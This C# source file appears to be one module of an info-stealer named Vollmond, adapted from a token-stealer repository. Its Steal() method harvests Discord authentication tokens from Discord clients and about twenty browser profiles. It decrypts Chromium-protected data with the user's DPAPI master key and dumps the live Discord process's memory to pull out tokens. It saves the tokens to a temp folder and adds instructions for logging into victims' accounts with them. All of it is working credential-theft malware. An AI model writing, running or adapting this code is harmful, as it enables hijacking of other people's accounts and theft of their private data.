using Newtonsoft.Json;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Vollmond.messengers
{
    // This is modified code, from repository: https://github.com/Weakpawn/discord-token-stealer-csharp/tree/main
    // Repository have an MIT Licencse!!!
    class discord
    {
        private static readonly Regex TokenRegex = new Regex(
            @"(?i)(mfa\.[a-z0-9_-]{84}|[a-z0-9_-]{24,26}\.[a-z0-9_-]{6}\.[a-z0-9_-]{27,110})",
            RegexOptions.Compiled);

        public static void Steal()
        {
            string baseDir = Path.Combine(Path.GetTempPath(), "Grabed_Data", "Discord");
            Directory.CreateDirectory(baseDir);
            string tokensPath = Path.Combine(baseDir, "tokens.txt");

            Dictionary<string, string> paths = new Dictionary<string, string>
            {
                { "Discord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord") },
                { "Discord Canary", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary") },
                { "Discord PTB", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb") },
                { "Lightcord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lightcord") },

                { "Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default") },
                { "Chrome SxS", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome SxS", "User Data") },

                { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable") },
                { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera GX Stable") },

                { "Amigo", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Amigo", "User Data") },
                { "Torch", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Torch", "User Data") },
                { "Kometa", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Kometa", "User Data") },
                { "Orbitum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Orbitum", "User Data") },
                { "CentBrowser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser", "User Data") },
                { "7Star", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "7Star", "7Star", "User Data") },
                { "Sputnik", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Sputnik", "Sputnik", "User Data") },
                { "Vivaldi", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi", "User Data", "Default") },

                { "Epic Privacy Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Epic Privacy Browser", "User Data") },
                { "Microsoft Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default") },
                { "Uran", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia", "Uran", "User Data", "Default") },
                { "Brave", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data", "Default") },
                { "Iridium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Iridium", "User Data", "Default") }
            };

            foreach (var entry in paths)
            {
                LdbGrab(entry.Value, tokensPath);
            }

            string discord_dump_path = Path.Combine(Path.GetTempPath(), "memory.dmp");
            foreach (Process proid in Process.GetProcessesByName("discord"))
            {
                try
                {
                    UInt32 ProcessId = (uint)proid.Id;
                    IntPtr hProcess = proid.Handle;
                    MINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;
                    string out_dump_path = Path.Combine(Environment.CurrentDirectory, "memory.dmp");
                    using (FileStream fs = File.Create(out_dump_path))
                    {
                        MiniDumpWriteDump(hProcess, ProcessId, fs.SafeFileHandle, DumpType, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    }
                    ExtractToken(out_dump_path, tokensPath);
                    File.Delete(out_dump_path);
                    break;
                }
                catch { }
            }

            string content =
                """
                ## How to use Discord tokens

                __In the tokens.txt file, you may see entries like: ANak2n_naj197hb - these are tokens.__

                1. **[Download this extension for Chrome](https://chromewebstore.google.com/detail/discord-token-login/pdmpkpjlmnndlfdllmnekbmgjikhghjg)**
                1. **In the extension, enter all the tokens one by one until you log in to your account (one token is valid; the other tokens are invalid)**
                """;
            File.WriteAllText(Path.Combine(baseDir, "INSTRUCTION.md"), content);
        }

        public static void LdbGrab(string path, string tokensPath)
        {
            if (!Directory.Exists(path)) return;

            string[] dbFiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
            byte[] masterKey = GetMasterKey();

            foreach (var file in dbFiles)
            {
                try
                {
                    byte[] data = File.ReadAllBytes(file);
                    string text = Encoding.UTF8.GetString(data);

                    foreach (Match m in TokenRegex.Matches(text))
                    {
                        string token = m.Value.Trim();
                        if (token.Length > 50 && !token.Contains(" ") && !token.Contains("\n"))
                            File.AppendAllText(tokensPath, token + Environment.NewLine);
                    }

                    if (masterKey != null)
                    {
                        string decrypted = DecryptV10V11(data, masterKey);
                        if (!string.IsNullOrEmpty(decrypted))
                        {
                            foreach (Match m in TokenRegex.Matches(decrypted))
                            {
                                string token = m.Value.Trim();
                                if (token.Length > 50)
                                    File.AppendAllText(tokensPath, token + Environment.NewLine);
                            }
                        }
                    }
                }
                catch { }
            }
        }

        static bool ExtractToken(string fn, string tokensPath)
        {
            if (!File.Exists(fn)) return false;
            try
            {
                string contents = File.ReadAllText(fn);
                foreach (Match m in TokenRegex.Matches(contents))
                {
                    string token = m.Value.Trim();
                    if (token.Length > 50)
                        File.AppendAllText(tokensPath, token + Environment.NewLine);
                }
                return true;
            }
            catch { return false; }
        }

        private static byte[] GetMasterKey()
        {
            string[] paths =
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local State"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary", "Local State"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb", "Local State")
            };

            foreach (string p in paths)
            {
                if (!File.Exists(p)) continue;
                try
                {
                    dynamic json = JsonConvert.DeserializeObject(File.ReadAllText(p));
                    string b64 = json.os_crypt.encrypted_key;
                    byte[] enc = Convert.FromBase64String(b64);
                    byte[] blob = enc.Skip(5).ToArray();
                    return ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
                }
                catch { }
            }
            return null;
        }

        private static string DecryptV10V11(byte[] data, byte[] masterKey)
        {
            if (masterKey == null) return null;

            string text = Encoding.UTF8.GetString(data);
            int pos = text.IndexOf("v10");
            if (pos == -1) pos = text.IndexOf("v11");
            if (pos == -1) return null;

            try
            {
                byte[] nonce = new byte[12];
                Buffer.BlockCopy(data, pos + 3, nonce, 0, 12);

                int start = pos + 15;
                if (start + 28 > data.Length) return null;

                byte[] ciphertext = new byte[data.Length - start - 16];
                Buffer.BlockCopy(data, start, ciphertext, 0, ciphertext.Length);

                byte[] tag = new byte[16];
                Buffer.BlockCopy(data, start + ciphertext.Length, tag, 0, 16);

                using (AesGcm aes = new AesGcm(masterKey))
                {
                    byte[] plain = new byte[ciphertext.Length];
                    aes.Decrypt(nonce, ciphertext, tag, plain);
                    return Encoding.UTF8.GetString(plain).TrimEnd('\0', '\r', '\n');
                }
            }
            catch { return null; }
        }

        public enum MINIDUMP_TYPE
        {
            MiniDumpWithFullMemory = 0x00000002,
        }

        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            UInt32 ProcessId,
            SafeHandle hFile,
            MINIDUMP_TYPE DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);
    }
}
